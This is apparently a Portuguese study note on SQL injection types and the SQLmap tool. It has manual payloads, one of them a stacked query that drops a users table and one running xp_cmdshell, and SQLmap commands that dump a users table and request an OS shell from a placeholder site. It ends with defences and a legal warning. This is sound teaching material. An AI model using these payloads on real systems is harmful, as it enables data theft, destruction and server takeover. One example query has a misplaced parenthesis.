2025-06-27 11:52

Status: #developed #segurança 

Tags: [[CyberSecurity]] | [[SQL Injection]] | [[SQLmap]] | [[3 - Tags/Segurança/SQL]] | [[Pentest]] | [[Ferramentas]]

----
# Introdução

SQL Injection (SQLi) é uma vulnerabilidade que permite a um atacante injetar comandos SQL maliciosos em uma aplicação web, manipulando entradas não sanitizadas. Existem várias tipos de SQL Injection, cada um com suas particularidades e métodos de exploração;

O **SQLmap** é uma ferramenta que automatiza a detecção e exploração dessas vulnerabilidades.

---
# Tipos de SQL Injection

## 1. Error-Based SQL Injection

Essa técnica é conhecida por forçar o banco de dados a gerar mensagens de erro para que, por meio disso, seja possível obter informações.

**Como funciona?**

- A aplicação retorna **mensagens de erro do banco de dados** que revelam informações sensíveis.
- O atacante força erros para extrair dados (como nomes de tabelas, usuários e senhas).

**Quando funciona?**

- Quando a aplicação exibe erros SQL diretamente ao usuário.

**Exemplo Manual:**

```sql
SELECT * FROM produtos WHERE id = 1 AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables));
```

- Se houver erro, pode ser revelado o nome da tabela.

**Uso no SQLmap:**

```bash
sqlmap -u "http://exemplo.com/produto.php?id-1" --technique=E
```

- `--technique=E` força o uso de **Error-Based Injection**.

---
## 2. Boolean-Based Blind SQL Injection

Também é uma técnica do tipo injeção cega, em que o usuário usa condições booleanas para verificar se são verdadeiras ou falsas e, com isso, obter informações do banco de dados.

**Como funciona?**

- A aplicação **não exibe erros**, mas responde de forma diferente dependendo se uma condição SQL é **verdadeira** ou **falsa**.
- O atacante envia consultas booleanas (`AND 1=1` vs `AND 1=2`) para inferir dados.

**Quando funciona?**

- Quando a aplicação não retornar erros, mas o comportamento muda conforme a condição.

**Exemplo Manual:**

```sql
SELECT * FROM usuarios WHERE login = 'admin' AND SUBSTRING(senha,1,1)='a';
```

- Se a página responder diferentes quando o primeiro caractere da senha for `'a'`, a vulnerabilidade existe.

**Uso no SQLmap:**

```bash
sqlmap -u "http://exemplo.com/login.php?user=admin" --technique=B
```

- `--technique=B` força o uso de **Boolean-Based Injection**

---
## 3. Time-Based Blind SQL Injection

É um tipo de técnica classificada como *"Blind Query"*, que significa que o usuário faz a consulta sem ver informações ou erros do banco de dados na página da aplicação. Nesse caso, ela apenas analisa o tempo de resposta do banco para fazer o ataque. Ou seja, o ataque depende de um tempo especificado para o banco de dados retornar resultados, indicando se a execução foi bem-sucedida ou não na consulta SQL.

**Como funciona?**

- A aplicação **não retorna erros nem diferenças visíveis**, mas demora mais para responder quando uma condição é verdadeira.
- O atacante usa funções como `SLEEP()` ou `BENCHMARK()` para inferir dados.

**Quando funciona?**

- Quando a aplicação não exibe erros nem diferenças visíveis, mas reponde com atraso.

**Exemplo Manual:**

```sql
SELECT * FROM produtos WHERE id = 1 AND IF(SUBSTRING(senha,1,1='a'), SLEEP(5), 0);
```

- Se a página demorar 5 segundos para carregar, o primeiro caractere da senha é `'a'`.

**Uso SQLmap:**

```bash
sqlmap -u "http://exemplo.com/produto.php?id=1" --technique=T
```

- `--technique=T` força o uso de **Time-Based Injection**

---
## 4. UNION-Based SQL Injection

É possível unir dois SELECTs que possibilitam fazer duas consultas.

**Como funciona?**

- O atacante usa `UNION SELECT` para combinar resultados de uma consulta legítima com dados roubados de outras tabelas.
- Requer que o número de colunas da consulta original seja conhecido.

**Quando funciona?**

- Quando a aplicação retorna resultados de uma consulta SQL diretamente na página.

**Exemplo Manual:**

```sql
SELECT nome, preco FROM produtos WHERE id = 1 UNION SELECT usuario, senha FROM usuarios;
```

- Se bem sucedido, exibe usuários e senhas na página.

**Uso no SQLmap:**

```bash
sqlmap -u "http://exemplo.com/produto.php?id=1" --technique=U
```

- `--technique=U` força o uso de **UNION-Based Injection**

---
## 5. Stacked Queries (Pilha de Consultas)

Injeção que é capaz de modificar dados além de encerrar um consulta atual, adicionando uma nova.

**Como funciona?**

- Permite executar **múltiplas consultas SQL** em uma única injeção.
- Útil para inserir/atualizar dados ou executar comandos no sistema.

**Quando funciona?**

- Quando o banco de dados suporta múltiplas consultas (ex: **Microsoft SQL Server, PostgreSQL**).

**Exemplo Manual:**

```sql
SELECT * FROM produtos WHERE id=1; DROP TABLE usuarios;
```

- Se bem-sucedido, deleta a tabela `usuarios`.

**Uso no SQLmap:**

```bash
sqlmap -u "http://exemplo.com/produto.php?id=1" --query="SELECT 1; DROP TABLE teste"
```

- `--query` executa uma consulta personalizada.

---
## 6. Command Injection (Injeção de Comandos)

Ocorre quando a aplicação é vulnerável a funções que proporcionam para o invasor acesso ao shell, onde ele pode inserir linhas de comando.

**Como funciona?**

- Permite executar **comandos do sistema operacional** através do banco de dados;
- Geralmente usa funções como `xp_cmdshell` (MS SQL) ou `sys_exec` (MySQL).

**Quando funciona?**

- Quando o banco de dados tem permissões para executar comandos externos.

**Exemplo Manual:**

```sql
EXEC xp_cmdshell 'whoami';
```

- Se bem-sucedido, retorna o usuário do sistema.

**Uso no SQLmap:**

```bash
sqlmap -u "http://exemplo.com/produto.php?id=1" --os-shell
```

- `--os-shell` tenta obter um shell no sistema.

---
# Comparação dos Tipos de SQL Injection

| **Tipo**          | **Requer exibição de erros?** | **Requer resposta diferente?** | Uso no SQLmap (`--technique=`) |
| ----------------- | ----------------------------- | ------------------------------ | ------------------------------ |
| Erro-Based        | ✅ Sim                         | ❌ Não                          | `E`                            |
| Boolean-Based     | ❌ Não                         | ✅ Sim                          | `B`                            |
| Time-Based        | ❌ Não                         | ❌ usa tempo                    | `T`                            |
| UNION-Based       | ❌ Não                         | ✅ exibe dados                  | `U`                            |
| Stacked Queries   | ❌ Não                         | ❌ executa múltiplas            | `S` (suporte limitado)         |
| Command Injection | ❌ Não                         | ❌ executa comandos             | `--os-shell`                   |

---
# Exemplo prático com SQLmap (Exploração Completa)

## Passo 1: Detecção de vulnerabilidades

```bash
sqlmap -u "http://exemplo.com/produto.php?id=1" --batch --dbs
```

- `--batch`: Executa automaticamente sem perguntas
- `--dbs`: Lista banco de dados.

## Passo 2: Extrair Tabelas

```bash
sqlmap -u "http://exemplo.com/produto.php?id=1" -D nome_db --tables
```

- `-D nome_db`: Especifica o banco de dados
- `--tables`: Lista tabelas
## Passo 3: Extrair Dados

```bash
sqlmap -u "http://exemplo.com/produto.php?id=1" -D nome_db -T usuarios --dump
```

- `-T usuarios`: Especifica a tabela
- `--dump`: Extrai todos os dados

## Passo 4: Obter Acesso ao Sistema (se possível)

```bash
sqlmap -u "http://exemplo.com/produto.php?id=1" --os-shell
```

- Tenta obter um shell no servidor.

---
# Como se proteger?

✅ **Use *Prepared Statements*** (consultas parametrizadas).
✅ **Validação e sanitização de todas as entradas.**
✅ **Limitar as permissões do banco de dados.**
✅ **Uso de WAFs *(Web Application Firewalls)***

---
# Conclusão

Cada tipo de SQL Injection tem suas particularidades, e o SQLmap pode automatizar a exploração de todas elas. Entender como funciona ajuda tanto em testes de penetração quanto na proteção de aplicações.

>[!warning] Aviso Legal
>Sempre teste apenas em sistemas com permissão. SQL Injection em Sistemas não autorizada é crime.

